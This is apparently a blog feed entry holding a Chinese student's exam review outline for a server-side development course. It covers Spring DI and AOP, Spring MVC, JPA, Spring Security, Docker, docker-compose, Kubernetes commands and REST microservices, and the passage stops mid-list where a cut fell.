    <content type="html"><![CDATA[<h1 id="服务端开发-复习大纲"><a href="#服务端开发-复习大纲" class="headerlink" title="服务端开发 复习大纲"></a>服务端开发 复习大纲</h1><h2 id="一、建立开发环境"><a href="#一、建立开发环境" class="headerlink" title="一、建立开发环境"></a>一、建立开发环境</h2><blockquote><p>一个简单 Spring Boot 应用程序的开发与运行</p></blockquote><h3 id="开发期工具：Spring-Boot-DevTools"><a href="#开发期工具：Spring-Boot-DevTools" class="headerlink" title="开发期工具：Spring Boot DevTools"></a>开发期工具：Spring Boot DevTools</h3><ul><li><p>代码变更后应用会自动重启；</p></li><li><p>当面向浏览器的资源等发生变化时，会自动刷新浏览器；</p></li><li><p>自动禁用模板缓存；</p></li><li><p>如果使用 H2 数据库，则内置了 H2 控制台：</p><p><a href="http://localhost:8080/h2-console">http://localhost:8080/h2-console</a></p></li></ul><p>仅在运行期（<strong>runtime</strong>）发挥作用。</p><h3 id="源代码仓库管理"><a href="#源代码仓库管理" class="headerlink" title="源代码仓库管理"></a>源代码仓库管理</h3><p>需纳入版本控制的有：功能代码、测试代码、测试脚本、构建脚本、部署脚本、配置文件。</p><h3 id="Git-关键概念"><a href="#Git-关键概念" class="headerlink" title="Git 关键概念"></a>Git 关键概念</h3><p><img src="https://assets.kekwy.com/images/image-20230409203014560.png" alt="image-20230409203014560"></p><p>add：从工作区提交到暂存区；</p><p>commit：从暂存区提交到本地仓库。</p><h2 id="二、依赖注入"><a href="#二、依赖注入" class="headerlink" title="二、依赖注入"></a>二、依赖注入</h2><blockquote><p>Spring 的两个核心技术：DI（依赖注入）、AOP（面向切面编程）；</p><p>Spring 是一个容器。</p></blockquote><h3 id="自动化配置"><a href="#自动化配置" class="headerlink" title="自动化配置"></a>自动化配置</h3><p>组件扫描、自动装配</p><p>@Component：告诉 Spring 需要在上下文中实例化一个当前类的对象作为 bean；</p><p>@Autowired：将实例化后的 bean 装配到当前对象中，使其建立其依赖关系。</p><ul><li>构造方法；</li><li>属性的 Setter 方法；</li><li>（私有）属性；</li></ul><h3 id="Bean-的作用域"><a href="#Bean-的作用域" class="headerlink" title="Bean 的作用域"></a>Bean 的作用域</h3><blockquote><p>可以使用 @Scope 注解改变 bean 的作用域</p></blockquote><ul><li>Singleton：单例；（默认）</li><li>Prototype：原型，每次注入或者通过 Spring 应用上下文获取的时候，都会创建一个新 bean 实例；</li><li>Session：会话，在 Web 应用中，为每个会话创建一个 bean 实例；</li><li>Request：请求，在 Web 应用中，为每个请求创建一个 bean 实例。</li></ul><h2 id="三、面向切面编程"><a href="#三、面向切面编程" class="headerlink" title="三、面向切面编程"></a>三、面向切面编程</h2><blockquote><p>软件开发一定要解耦</p></blockquote><p>场景：</p><ul><li>将日志逻辑与业务代码分离；</li><li>安全认证与业务代码解耦合；</li><li>事务处理；</li><li>缓存。</li></ul><p>重点：解耦合</p><p>其他的是想方式：</p><p>继承：继承自一个具有相关功能的类，但是导致业务类对日志类形成强依赖；</p><p>委托：维护一个日志对象的引用</p><p>面向切面：业务代码对切面层代码<strong>无感知</strong></p><h3 id="Spring-开启切面"><a href="#Spring-开启切面" class="headerlink" title="Spring 开启切面"></a>Spring 开启切面</h3><ol><li>在 pojo 上添加 @Aspect 注解；</li><li>实例化切面对象；</li><li>在主类上添加启用切面的注解 @EnableAspectJAutoProxy；</li></ol><p>spring 仅支持方法作为连接点：将切面插在调用前或调用后</p><p>织入：编译时织入、类加载器织入、运行期织入</p><p>横切关注点。</p><p>AOP（代理实现）的好处，对开发者：</p><p>业务对象和切面完全解耦，可以分别开发；</p><p>运行时可以结合在一起，也可以灵活修改是否要切入以及在哪切入；</p><p>修改切面不必更改业务层代码。</p><h3 id="避免切点表达式重复"><a href="#避免切点表达式重复" class="headerlink" title="避免切点表达式重复"></a>避免切点表达式重复</h3><p>dry原则：避免重复</p><p>避免切点表达式重复，使用 <code>@Pointcut</code> 注解进行提取。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Pointcut(&quot;execution(* concert.Performance.perform( .. ))&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">performance</span><span class="params">()</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Before(&quot;performance()&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> </span><br></pre></td></tr></table></figure><h3 id="Around"><a href="#Around" class="headerlink" title="@Around"></a>@Around</h3><blockquote><p>但凡上学期写 Java 大作业的时候知道这个好东西…</p><p>没有 @Component 的作用！！！该实例不属于 Spring 包</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Around(&quot;performance()&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(ProceedingJoinPoint joinPoint)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        doSomething1();<span class="comment">// @Before</span></span><br><span class="line">        joinPoint.proceed();<span class="comment">// 调用切点方法</span></span><br><span class="line">        doSomething2();<span class="comment">// @AfterReturning</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">        doSomething3();<span class="comment">// @AfterThrowing</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="兼有-Component-效果的注解"><a href="#兼有-Component-效果的注解" class="headerlink" title="兼有 @Component 效果的注解"></a>兼有 @Component 效果的注解</h3><p>@Controller；</p><p>@Service；</p><p>@Repository.</p><h3 id="AOP-术语在-Spring-中的解释"><a href="#AOP-术语在-Spring-中的解释" class="headerlink" title="AOP 术语在 Spring 中的解释"></a>AOP 术语在 Spring 中的解释</h3><ul><li>通知（Advice）：切面做什么以及何时做，在方法上添加 @Before 等注解；</li><li>切点（Pointcut）：何处，切点表达式；</li><li>切面（Aspect）：Advice 和 Pointcut 的结合， Aspect 类；</li><li>连接点（Join point）：方法、字段修改、构造方法；</li><li>引入（introduction）：引入新的行为和状态；</li><li>织入（Weaving）：切面应用到目标对象的过程。</li></ul><h3 id="切点指示器"><a href="#切点指示器" class="headerlink" title="切点指示器"></a>切点指示器</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Pointcut(&quot;execution(* soundsystem.CompactDisc.playTrack(  int  ))&quot;</span></span><br><span class="line"><span class="meta">         + &quot;&amp;&amp; args(trackNumber)&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">trackPlayed</span><span class="params">(<span class="type">int</span> trackNumber)</span> &#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">args 指示器的使用：</span></span><br><span class="line"><span class="comment">通过切点指示器 `args(trackNumber)` 将切点方法中的参数 trackNumber 引入当前的</span></span><br><span class="line"><span class="comment">切面方法中。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Before(&quot;trackPlayed(trackNumber)&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">countTrack</span><span class="params">(<span class="type">int</span> trackNumber)</span> &#123;</span><br><span class="line">    ... <span class="comment">// 此时方法中传入的参数 trackNumber，即为切点目标方法被调用时传入的参数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其他的指示器：</p><p><code>execution(* soundsystem.CompactDisc.playTrack(  int  ))</code> 表示对任何该方法的实现都进行植入，有可以该方法在其他包中有存在实现，该写法也会为其进行植入。</p><ul><li><code>&amp;&amp; within(soundsystem.*) </code>：限定包路径；</li><li><code>&amp;&amp; bean(sgtPeppers)</code>：限定bean名称，或者： &amp;&amp; !bean(sgtPeppers)；</li><li><code>@Around(&quot;@annotation(innerAuth)&quot;) </code>：限定注解。（RuoYi 框架）。</li></ul><h3 id="引入接口（introduction）"><a href="#引入接口（introduction）" class="headerlink" title="引入接口（introduction）"></a>引入接口（introduction）</h3><blockquote><p>需要给一个已有的类增加一些新的方法与属性，但是又不改动原有的类。</p><p>在 Spring 中可以通过定义切面实现，Spring 会用代理对象的方式进行织入。</p></blockquote><p><img src="https://assets.kekwy.com/images/image-20230406161346465.png" alt="image-20230406161346465"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Aspect</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EncoreableIntroducer</span> &#123;</span><br><span class="line">    <span class="meta">@DeclareParents(value = &quot;concert.Performance+&quot;,//后面的+表示应用到所有实现了该接口的Bean</span></span><br><span class="line"><span class="meta">            defaultImpl = DefaultEncoreable.class)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Encoreable encoreable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将 <code>DefaultEncoreable</code> 中的行为加入上述指定的 bean 中。</p><h2 id="四、Web-开发框架（Web-MVC）"><a href="#四、Web-开发框架（Web-MVC）" class="headerlink" title="四、Web 开发框架（Web MVC）"></a>四、Web 开发框架（Web MVC）</h2><h3 id="lombok"><a href="#lombok" class="headerlink" title="lombok"></a>lombok</h3><p>简化代码的书写，避免反复编写重复的代码；</p><p>编译期之后不需要，要排除；</p><p>为使其正确被 IDE 识别，需要在 IDE 中安装对应的插件。</p><h3 id="session"><a href="#session" class="headerlink" title="session"></a>session</h3><p>客户端与服务端之前的多次请求。</p><h3 id="Spring-MVC-的请求映射注解"><a href="#Spring-MVC-的请求映射注解" class="headerlink" title="Spring MVC 的请求映射注解"></a>Spring MVC 的请求映射注解</h3><p>通用的：</p><p>@RequestMapping;（可以放在类的上面也可以放在方法上面）</p><p>具体的：</p><p>@GetMapping;</p><p>@PostMapping;</p><p>@PutMapping;</p><p>@DeleteMapping;</p><p>@PatchMapping.</p><h3 id="视图控制器"><a href="#视图控制器" class="headerlink" title="视图控制器"></a>视图控制器</h3><blockquote><p>免去定义一个 Controller 类</p></blockquote><p>用于定义简单的返回一个视图的功能。</p><h3 id="程序入口"><a href="#程序入口" class="headerlink" title="程序入口"></a>程序入口</h3><p>SpringBoot 的程序入口类需要添加 @SpringBootApplication 注解。</p><h3 id="三层架构"><a href="#三层架构" class="headerlink" title="三层架构"></a>三层架构</h3><p><img src="https://assets.kekwy.com/images/image-20230409205416496.png" alt="image-20230409205416496"></p><ol><li><p>根据 url 找到对应的控制器；</p></li><li><p>对客户端的参数进行解析（@PathVariable 路径参数、@RequestParam 请求参数、model 表单参数、@RequestBody json 请求体）；</p></li><li><p>控制器调用业务层方法，获取返回值；</p></li><li><p>对于前后端不分离的场景，控制器将数据加入 model，返回视图名；</p><p>对于前后端分离的场景，将 Java 对象转为 json 对象，@RestController、@ResponseBody。</p></li></ol><h2 id="五、数据持久化"><a href="#五、数据持久化" class="headerlink" title="五、数据持久化"></a>五、数据持久化</h2><blockquote><p>Spring Data JDBC、JPA</p></blockquote><h3 id="JdbcTemplate"><a href="#JdbcTemplate" class="headerlink" title="JdbcTemplate"></a>JdbcTemplate</h3><blockquote><p>简化样板式的代码，jdbc 驱动程序、屏蔽底层各数据库的差异</p></blockquote><p>只需要提供查询的逻辑，获得 connection 以及将其关闭等重复性代码由 Spring 代为完成；</p><p>需要自定义中间表存放各对象的关联关系。</p><h3 id="SpringDataJdbc"><a href="#SpringDataJdbc" class="headerlink" title="SpringDataJdbc"></a>SpringDataJdbc</h3><p>包路径为 org.springframework.data.annotation.*：Spring 本身提供；</p><p>不需要实现接口，在实体类上添加注解 @Table（可选，用于指定表名）。</p><p>resource 目录下的 schema.sql 文件会在程序启动时被执行，用于表的创建；</p><p>data.sql 用于初始化数据，一般用于测试。</p><p>id 在插入后由数据库自动生成，下同。</p><h3 id="SpringDataJPA"><a href="#SpringDataJPA" class="headerlink" title="SpringDataJPA"></a>SpringDataJPA</h3><p>只需要定义接口，且父接口的包路径与 SpringDataJdbc 相同；</p><p>包路径为：javax.persistence.* 是一个标准的包路径，与具体的厂家没有关系；</p><p>JPA 是一个规范，不同的厂家可以分别实现；</p><p>需要添加 @Entity 的注解（必须），根据注解表达的类间关系自动创建表结构，并且根据包含关系额外创建中间表）；</p><h3 id="JPA-自定义查询方法"><a href="#JPA-自定义查询方法" class="headerlink" title="JPA 自定义查询方法"></a>JPA 自定义查询方法</h3><blockquote><p>JPA 的宗旨是为 POJO 提供持久化标准规范</p></blockquote><p>可以自定义查询方法，无需实现：</p><ul><li>领域特定语言，spring data 的命名约定；</li><li>查询动词 + 主题 + 断言；</li><li>查询动词：get、read、find、count。</li></ul><p>声明自定义查询：</p><p>不符合方法命名约定时，或者命名太长时，可以使用 JPQL 语句：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Query(&quot;Order o where o.deliveryCity = &#x27;Seattle&#x27;&quot;)</span></span><br><span class="line">List&lt;TacoOrder&gt; <span class="title function_">readOrdersDeliveredInSeattlt</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure><p>spring data jdbc 也可以使用该注解自定义查询逻辑，但是功能十分有限。</p><h3 id="为什么要先定义接口？"><a href="#为什么要先定义接口？" class="headerlink" title="为什么要先定义接口？"></a>为什么要先定义接口？</h3><ol><li>我们在实现接口时有很多可选的实现方案，解耦需求；</li><li>帮助测试，需要测试业务层代码，基于接口模拟实现，避免启动真实的数据库；</li></ol><p>CommandLineRunner bean 可用于对数据进行初始化</p><p>ApplicationRunner 接口，获得参数的方式不同</p><p>【问答】三者的关系</p><p>第一个需要我们实现接口，后两个不需要我们实现接口。</p><p>JPA 是一个规范，Hibernate 是一个实现了该规范的厂家，spring data jpa 提供了支持 JPA 规范的框架，支持引入各厂家对 JPA 的具体实现。</p><h2 id="六、Spring-Security"><a href="#六、Spring-Security" class="headerlink" title="六、Spring Security"></a>六、Spring Security</h2><h3 id="用户信息的存储"><a href="#用户信息的存储" class="headerlink" title="用户信息的存储"></a>用户信息的存储</h3><ul><li>内存用户存储；</li><li>JDBC 用户存储；</li><li>LDAP 用户存储。</li></ul><h3 id="Spring-Security-的工作方式"><a href="#Spring-Security-的工作方式" class="headerlink" title="Spring Security 的工作方式"></a>Spring Security 的工作方式</h3><blockquote><p>userdetail、userdetailService</p></blockquote><p><img src="https://assets.kekwy.com/images/image-20230409213149090.png" alt="image-20230409213149090"></p><ul><li>实现用户信息的存储；</li><li>实现 UserdetailService 接口，根据参数用户名从 Dao 层获取用户对象；</li><li>实现 PasswordEncoder 接口并在 Spring 上下文中实例化；</li><li>用户认证与授权由 Spring Security 自动完成；</li><li>HttpSecurity 中设置访问各路径需要的权限；</li><li>提供参数 username、password（也可以自行配置）；</li></ul><p>.loginPage(url)：配置登录时需要跳转到的路径。</p><p>服务端依据 sessionID 判断当前请求是否来自一个认证过的用户</p><p>指定login url，框架会自动对发送到该 url 的 post 请求进行处理</p><p>指定 logout url，post 到该 url 可以使当前客户端 cookie 失效（发送一个新的未绑定用户的 cookie）</p><h2 id="七、Docker-使用"><a href="#七、Docker-使用" class="headerlink" title="七、Docker 使用"></a>七、Docker 使用</h2><h3 id="docker-run-命令"><a href="#docker-run-命令" class="headerlink" title="docker run 命令"></a>docker run 命令</h3><ul><li>-d: 后台运行容器，并返回容器ID</li><li>-i: 以交互模式运行容器，通常与 -t 同时使用</li><li>-t: 为容器重新分配一个伪输入终端，通常与 -i 同时使用</li><li>-p: 指定（发布）端口映射，格式为：主机(宿主)端口:容器端口</li><li>-P: 随机端口映射，容器内部端口随机映射到主机的高端口</li><li>–name&#x3D;”nginx-lb”: 为容器指定一个名称</li><li>-e username&#x3D;”ritchie”: 设置环境变量</li><li>–env-file&#x3D;c:&#x2F;temp1&#x2F;t1.txt: 从指定文件读入环境变量</li><li>–expose&#x3D;2000-2002: 开放（暴露）一个端口或一组端口；</li><li>–link my-mysql:taozs : 添加链接到另一个容器</li><li>-v c:&#x2F;temp1:&#x2F;data: 绑定一个卷(volume)</li><li>–rm 退出时自动删除容器</li></ul><p>cat &#x2F;etc&#x2F;hosts 查看当前容器的 IP 地址。</p><h3 id="常用管理命令"><a href="#常用管理命令" class="headerlink" title="常用管理命令"></a>常用管理命令</h3><ul><li>volume：数据卷；</li><li>network：网络；</li><li>container：容器；</li><li>image：镜像。</li></ul><p>docker stop：停止容器，可以被重启。</p><hr><p>容器与虚拟机的区别：</p><p><img src="https://assets.kekwy.com/images/image-20230407204243990.png"></p><p>虚拟机：完全独立；</p><p>容器：共享一个操作系统内核。</p><p>对使用者来说容器与虚拟机完全相同</p><h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><p>docker 是一个软件用于管理容器，而不是容器本身。</p><p>组成部分：client、daemon（engine）、index（指向 docker 仓库）。</p><p>docker 利用 Hyper-V 技术在 Windows 操作系统中生成一台 Linux 虚拟机，然后在其中运行 docker engine。</p><p>spring 的容器是 bean、tomcat 的容器是 servlet</p><p>容器的作用：获得一个纯净的运行环境。</p><p>生产流程：基于容器技术可以实现持续集成持续交付的流水线；</p><p>软件架构：将大的系统细分为一个个微服务，微服务的架构模式与容器技术相伴而生。</p><p>docker -&gt; kubernetes-&gt;istio</p><p>-it 进入交互模式</p><p>–rm 退出交互自动删除</p><p>数据卷 volume 容器挂掉也可以保存</p><p>myvolume:&#x2F;data 冒号的左边为数据卷空间，右边为想要映射到的虚拟机中的目录</p><h3 id="容器网络"><a href="#容器网络" class="headerlink" title="容器网络"></a>容器网络</h3><blockquote><p>容器之间的互联互通</p></blockquote><p>docker network ls：</p><p>bridge 网络（类比交换机）</p><p>镜像就相当于 class，容器就相当于对象。</p><p> none网络，–net&#x3D;none<br> host网络，–net&#x3D;host 【共享宿主机网络】<br> bridge网络，–net&#x3D;bridge ， docker0 的 linux bridge 【NAT 网关】<br> container模式，–net&#x3D;container:NAME_or_ID</p><h2 id="八、镜像的构建与编排"><a href="#八、镜像的构建与编排" class="headerlink" title="八、镜像的构建与编排"></a>八、镜像的构建与编排</h2><p>制作镜像的核心文件：Dockerfile</p><h3 id="Dockerfile-的命令"><a href="#Dockerfile-的命令" class="headerlink" title="Dockerfile 的命令"></a>Dockerfile 的命令</h3><ul><li>FROM：指定基础镜像，必须为第一个命令</li><li>RUN：构建镜像时执行的命令</li><li>ADD：将本地文件添加到容器中，tar类型文件会自动解压</li><li>COPY：功能类似ADD，但是不会自动解压文件</li><li>CMD：构建容器后调用，也就是在容器启动时才进行调用</li><li>ENTRYPOINT：配置容器，使其可执行化。配合CMD可省去“application”，只使用参数，用于docker run时根据不同参数执行不同功能</li><li>LABEL：用于为镜像添加元数据</li><li>ENV：设置环境变量 相当于 -e</li><li>EXPOSE：指定与外界交互的端口，容器内的端口号，docker run时加-P则会映射一个随机号（宿主机）</li><li>VOLUME：用于指定持久化目录，docker run时如果没有指定挂载目录，会创建一个volume</li><li>WORKDIR：工作目录，类似于cd命令</li><li>USER：指定运行容器时的用户名或 UID</li><li>ARG：用于指定传递给构建运行时的变量</li><li>ONBUILD：用于设置镜像触发器</li></ul><p>copy 命令会忽略 .dockerignore 中的文件或目录</p><h3 id="编写最佳的-Dockerfile"><a href="#编写最佳的-Dockerfile" class="headerlink" title="编写最佳的 Dockerfile"></a>编写最佳的 Dockerfile</h3><ul><li>使用 .dockerignore文件；</li><li>容器只运行单个应用；</li><li>将多个 RUN 指令合并为一个，减少镜像的分层；</li><li>基础镜像的标签不要用 latest；</li><li>每个 RUN 指令后删除多余文件；</li><li>选择合适的基础镜像(alpine版本最好)；</li><li>设置 WORKDIR 和 CMD.</li></ul><h3 id="镜像分层"><a href="#镜像分层" class="headerlink" title="镜像分层"></a>镜像分层</h3><p>将多个 RUN 合成一个，尽可能避免过多的创建镜像层级</p><p>合理调整 dockerfile 命令的顺序，加快镜像构建速度。将经常变化的指令放在后面。</p><p>Alpine 轻量级（jdk -&gt; jre）</p><h3 id="与容器交互"><a href="#与容器交互" class="headerlink" title="与容器交互"></a>与容器交互</h3><p>docker -exec </p><h3 id="Docker-Compose"><a href="#Docker-Compose" class="headerlink" title="Docker Compose"></a>Docker Compose</h3><blockquote><p>依赖 yaml 文件</p></blockquote><p>服务：一个应用的容器（可能会有多个容器），实际上可以包括若干运行相同镜像的容器实例；</p><p>项目：由一组关联的应用容器组成的一个完整业务单元，在 docker-compose.yml 文件中定义。</p><h3 id="YAML"><a href="#YAML" class="headerlink" title="YAML"></a>YAML</h3><ul><li><p>使用缩进表示层级关系，不允许使用Tab键，只允许使用空格</p></li><li><p>#表示注释，从这个字符一直到行尾，都会被解析器忽略。</p></li><li><p>对象，键值对，使用冒号结构表示</p></li><li><p>animal: pets</p><ul><li>hash: { name: Steve, foo: bar }</li></ul></li><li><p>数组,一组连词线开头的行，构成一个数组：</p><p>- Cat</p><p>- Dog</p><p>- Goldfish</p><ul><li>行内表示法：animal: [Cat, Dog]</li></ul></li></ul><h3 id="docker-compose-常用命令"><a href="#docker-compose-常用命令" class="headerlink" title="docker-compose 常用命令"></a>docker-compose 常用命令</h3><ul><li>docker-compose –help；</li><li>docker-compose up -d # 该命令十分强大，它将尝试自动完成包括构建镜像，（重新）创建服务，启动服务，并关联服务相关容器的一系列操作；</li><li>* docker-compose ps、docker-compose ps –services：仅呈现当前所部署的项目下的容器，而不是呈现所有的；</li><li>* docker-compose images；</li><li>docker-compose stop # 终止整个服务集合；</li><li>docker-compose stop nginx # 终止指定的服务 （这有个点就是启动的时候会先启动 depond_on 中的容器，关闭的时候不会影响到 depond_on 中的）；</li><li>* docker-compose logs -f [services…] # 查看容器的输出日志；</li><li>docker-compose build [SERVICE…]；</li><li>docker-compose rm nginx # 移除指定的容器；</li><li>docker-compose up -d –scale flask&#x3D;3 organizationservice&#x3D;2 #设置指定服务运行的容器个数。</li></ul><h2 id="九、k8s-使用"><a href="#九、k8s-使用" class="headerlink" title="九、k8s 使用"></a>九、k8s 使用</h2><blockquote><p>kubectl 是 k8s 的一个客户端程序</p></blockquote><h3 id="k8s-的资源"><a href="#k8s-的资源" class="headerlink" title="k8s 的资源"></a>k8s 的资源</h3><p>ingress、deployment、service、pod.</p><h3 id="Pod"><a href="#Pod" class="headerlink" title="Pod"></a>Pod</h3><blockquote><p>Pod是Kubernetes调度的最小单元</p></blockquote><p>一个Pod可以包含一个或多个容器，因此它可以被看作是内部容器的逻辑宿主机。Pod的设计理念是为了支持多<br>个容器在一个Pod中共享网络和文件系统：</p><ul><li>PID命名空间：Pod中不同的应用程序可以看到其他应用程序的进程ID；</li><li>network命名空间：Pod中多个容器处于同一个网络命名空间，因此能够访问的IP和端口范围都是相同的。也可以通过localhost相互访问；</li><li>IPC命名空间：Pod中的多个容器共享Inner-process Communication命名空间，因此可以通过SystemV IPC或POSIX进行进程间通信；</li><li>UTS命名空间：Pod中的多个容器共享同一个主机名；</li><li>Volumes：Pod中各个容器可以共享在Pod中定义分存储卷（Volume）。</li></ul><h3 id="快速映射（调试用）"><a href="#快速映射（调试用）" class="headerlink" title="快速映射（调试用）"></a>快速映射（调试用）</h3><blockquote><p>本地 : pod&#x2F;service</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kubectl port-forward pod/myspittr 8081:8080</span><br><span class="line"><span class="comment"># http://localhost:8081/spittr/</span></span><br><span class="line">kubectl port-forward service/demo 8081:80</span><br></pre></td></tr></table></figure><h3 id="其他两种访问内部服务的方式"><a href="#其他两种访问内部服务的方式" class="headerlink" title="其他两种访问内部服务的方式"></a>其他两种访问内部服务的方式</h3><ul><li><p>创建 ingress；</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create ingress myspittr --class=nginx --rule=www.demo.com/*=myspittr:8080</span><br></pre></td></tr></table></figure></li><li><p>使用 curl 工具。</p></li></ul><p>为什么需要“打标签”：可以为服务指定对应的pod；</p><p>服务的集群 IP 是相对不变的。</p><h3 id="进行动态的升级和扩容"><a href="#进行动态的升级和扩容" class="headerlink" title="进行动态的升级和扩容"></a>进行动态的升级和扩容</h3><ul><li><p>更新镜像重部署：</p><p>kubectl set image deployment&#x2F;spittr spittr&#x3D;spittr:1.0</p></li><li><p>扩容：</p><p>kubectl scale deployment spittr –replicas 2</p></li><li><p>自动伸缩：</p><p>kubectl autoscale deployment spittr –min&#x3D;10 –max&#x3D;15 –cpu-percent&#x3D;80 请求量大可以多部署一些实例</p></li><li><p>查看历史版本：</p><p>kubectl rollout history deployment&#x2F;spittr</p></li><li><p>回滚到前一个版本：</p><p>kubectl rollout undo deployment&#x2F;spittr</p></li></ul><hr><p>docker 只能部署在一个设备上，而 k8s 可以对集群环境进行管理，k8s 可以调度自动决定将镜像搭载在哪一个虚机上。</p><p>我们的课程中，k8s 依赖的虚机是由 docker 创建出来的</p><p>k8s 的使用以 docker 为基础，每一个加入集群的 node 都需要安装 docker 软件。</p><p><img src="https://assets.kekwy.com/images/image-20230409094315446.png" alt="image-20230409094315446"></p><p>对外可供访问的资源是 “服务”，不要直接访问具体的 pod，因为 pod 的分配是由 k8s 动态管理的。</p><p>服务可能由多个 pod 组成，但是使用者只需知道服务名，而不必关心提供服务的 pod 有哪些。</p><h2 id="十、REST-服务、微服务开发与部署"><a href="#十、REST-服务、微服务开发与部署" class="headerlink" title="十、REST 服务、微服务开发与部署"></a>十、REST 服务、微服务开发与部署</h2><h3 id="单体应用程序的缺陷"><a href="#单体应用程序的缺陷" class="headerlink" title="单体应用程序的缺陷"></a>单体应用程序的缺陷</h3><ul><li>数据库的表对所有模块可见；</li><li>一个人的修改整个应用都要重新构建、测试、部署；</li><li>整体复制分布式部署，不能拆分按需部署。</li></ul><h3 id="微服务架构模式的特征"><a href="#微服务架构模式的特征" class="headerlink" title="微服务架构模式的特征*"></a>微服务架构模式的特征*</h3><ul><li>应用程序分解为具有明确定义了职责范围的细粒度组件；</li><li>完全独立部署，独立测试，并可复用；</li><li>使用轻量级通信协议，HTTP 和 json，松耦合；</li><li>服务实现可使用多种编程语言和技术；</li><li>将大型团队划分为多个小型团队，每个团队只负责开发维护他们各自的服务。</li></ul><h3 id="Spring-Boot-和-Spring-Cloud"><a href="#Spring-Boot-和-Spring-Cloud" class="headerlink" title="Spring Boot 和 Spring Cloud"></a>Spring Boot 和 Spring Cloud</h3><ul><li>Spring Boot 提供了基于 Java 的、面向 REST 的微服务框架；</li><li>Spring Cloud 使实施和部署微服务到私有云或公有云变得更加简单。</li></ul><h3 id="HTTP-状态码"><a href="#HTTP-状态码" class="headerlink" title="HTTP 状态码*"></a>HTTP 状态码*</h3><ul><li>状态码：由 3 位数字组成，第一位标识响应的类型，常用的5大类状态码如下：<ul><li>1xx：表示服务器已接收了客户端的请求，客户端可以继续发送请求</li><li>2xx：表示服务器已成功接收到请求并进行处理</li><li>3xx：表示服务器要求客户端重定向</li><li>4xx：表示客户端的请求有非法内容</li><li>5xx：标识服务器未能正常处理客户端的请求而出现意外错误</li></ul></li></ul><h3 id="Controller-的两个作用"><a href="#Controller-的两个作用" class="headerlink" title="Controller 的两个作用"></a>Controller 的两个作用</h3><ul><li>标识：告诉开发者这个类是一个控制器实现；</li><li>component 的作用：告诉 Spring 需要实例化一个该类的对象 bean。</li></ul><h3 id="ExceptionHandler"><a href="#ExceptionHandler" class="headerlink" title="@ExceptionHandler"></a>@ExceptionHandler</h3><p>自定义异常处理方法。</p><p>如果服务端不定义自定义处理方法，则仅会向客户端返回 500 状态码，而客户端不知道服务端出现了什么问题，这是对客户端不友好的。</p><h3 id="ResponseStatus"><a href="#ResponseStatus" class="headerlink" title="@ResponseStatus"></a>@ResponseStatus</h3><p>可以在这个注解中统一指定响应码。</p><h3 id="Rest-原则"><a href="#Rest-原则" class="headerlink" title="Rest 原则"></a>Rest 原则</h3><p> Representational State Transfer，表现层状态转移<br> 资源（Resources），就是网络上的一个实体，标识：URI<br> 表现层（Representation）：json、xml、html、pdf、excel<br> 状态转移（State Transfer）：服务端–客户端<br> HTTP协议的四个操作方式的动词：GET、POST、PUT、DELETE<br>✓ CRUD：Create、Read、Update、Delete<br> 如果一个架构符合REST原则，就称它为RESTful架构。</p><h3 id="Spring-Boot"><a href="#Spring-Boot" class="headerlink" title="Spring Boot"></a>Spring Boot</h3><p> 简化Spring Web开发<br> Spring Boot Starter<br>✓ 自动管理依赖、版本号<br> 自动配置<br>✓ 根据类路径加载的类自动创建需要的Bean<br>✓ 如：DataSource、JdbcTemplate、视图解析器等<br> Actuator：获得很多的端点*<br>✓ &#x2F;autoconfig 使用了哪些自动配置（positiveMatches）<br>✓ 